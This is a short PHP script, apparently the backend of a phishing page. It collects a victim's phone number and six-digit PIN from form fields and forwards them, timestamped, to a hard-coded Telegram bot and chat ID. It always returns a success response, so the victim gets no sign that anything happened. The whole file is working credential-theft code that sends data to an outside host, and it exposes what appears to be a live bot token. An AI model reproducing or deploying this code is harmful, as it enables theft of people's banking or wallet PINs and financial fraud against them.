<?php
// =============================================
// 👇 WAJIB DIISI YANG BENAR YA
$bot_token = "8910409178:AAFJPkGid244-ugTmXK8cUTOF1A48z4bTkE";  // Contoh: 789012345:ABCdefGhIjKlMnOpQrStUvWxYz
$chat_id   = "7532499014"; // Contoh: 123456789
// =============================================

header('Content-Type: application/json');

$nohp = trim($_POST['nohp'] ?? '');
$inp1 = trim($_POST['inp1'] ?? '');
$inp2 = trim($_POST['inp2'] ?? '');
$inp3 = trim($_POST['inp3'] ?? '');
$inp4 = trim($_POST['inp4'] ?? '');
$inp5 = trim($_POST['inp5'] ?? '');
$inp6 = trim($_POST['inp6'] ?? '');
$tarif = trim($_POST['tarif'] ?? '');

$pin = $inp1 . $inp2 . $inp3 . $inp4 . $inp5 . $inp6;

if (!empty($pin)) {
    $pesan = "🔐 PIN Sank Juara\n";
    $pesan .= "────────────────────\n";
    $pesan .= "No. HP: +62$nohp\n";
    $pesan .= "PIN: $pin\n";
    if (!empty($tarif)) {
        $pesan .= "Tarif: $tarif\n";
    }
    $pesan .= "Waktu: " . date('d-m-Y H:i:s') . "\n";
    $pesan .= "────────────────────";

    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'chat_id' => $chat_id,
        'text' => $pesan
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);
}

echo json_encode(['status' => 'ok']);
